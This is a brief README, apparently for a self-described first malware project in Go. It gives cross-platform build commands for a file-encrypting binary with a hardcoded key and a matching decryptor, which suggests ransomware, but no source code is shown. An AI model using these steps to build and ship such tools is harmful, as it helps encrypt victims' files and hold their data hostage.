My first Malware with GO

Compile for Linux
GOOS=linux GOARCH=amd64 go build -ldflags "-X 'main.secretKey=MyVerySecretKeyForEncryption1234'" -o encrypt_files_linux encrypt_files.go
GOOS=linux GOARCH=amd64 go build -o decrypt_files_linux decrypt_files.go

Compile for Windows
GOOS=windows GOARCH=amd64 go build -ldflags "-X 'main.secretKey=MyVerySecretKeyForEncryption1234'" -o encrypt_files_win.exe encrypt_files.go
GOOS=windows GOARCH=amd64 go build -o decrypt_files_win.exe decrypt_files.go

Compile for MacOs
GOOS=darwin GOARCH=amd64 go build -ldflags "-X 'main.secretKey=MyVerySecretKeyForEncryption1234'" -o encrypt_files_mac encrypt_files.go
GOOS=darwin GOARCH=amd64 go build -o decrypt_files_mac decrypt_files.go
